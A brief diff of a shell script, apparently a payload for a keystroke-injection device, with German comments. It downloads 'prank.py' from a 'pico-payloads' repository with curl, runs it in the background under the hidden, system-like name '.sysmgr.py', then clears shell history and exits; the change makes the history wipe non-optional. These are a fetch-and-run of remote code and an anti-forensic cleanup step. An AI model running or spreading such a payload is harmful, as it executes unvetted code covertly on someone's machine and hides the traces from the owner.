@@ -10,6 +10,6 @@ curl -sL https://raw.githubusercontent.com/Nepflo/pico-payloads/main/prank.py -o
 # Ausführen
 python3 .sysmgr.py &
 
-# Aufräumen (optional)
+# Aufräumen
 history -c
 exit
